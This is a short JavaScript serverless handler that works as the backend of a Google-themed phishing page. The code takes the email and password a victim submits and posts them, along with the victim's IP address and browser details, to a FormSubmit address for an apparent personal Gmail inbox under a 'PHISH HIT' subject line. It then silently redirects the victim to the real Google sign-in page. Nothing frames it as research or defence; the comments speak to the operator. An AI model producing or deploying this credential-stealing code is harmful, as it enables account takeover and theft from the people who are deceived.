exports.handler = async (event) => {
    // 1. Parse the incoming form data
    const params = new URLSearchParams(event.body);
    const victimEmail = params.get('email');
    const victimPassword = params.get('password');

    // 2. Send the credentials to your inbox using FormSubmit
    const formSubmitData = {
        _subject: `🚨 PHISH HIT: ${victimEmail}`,
        _template: 'table',
        _captcha: 'false',
        Target_Email: victimEmail,
        Captured_Password: victimPassword,
        Timestamp: new Date().toISOString(),
        User_Agent: event.headers['user-agent'] || 'Unknown',
        Remote_IP: event.headers['x-forwarded-for'] || 'Unknown'
    };

    try {
        // UPDATED: Your email is now in the URL
        const response = await fetch('https://formsubmit.co/tradylewis98@gmail.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(formSubmitData)
        });
        
        // Log the response to see if FormSubmit accepted it
        console.log('FormSubmit Response Status:', response.status);
        const data = await response.json();
        console.log('FormSubmit Response Body:', data);

    } catch (error) {
        console.error('FormSubmit error:', error);
    }

    // 3. Redirect the victim to the real Google login page
    return {
        statusCode: 302,
        headers: {
            'Location': 'https://accounts.google.com'
        }
    };
};
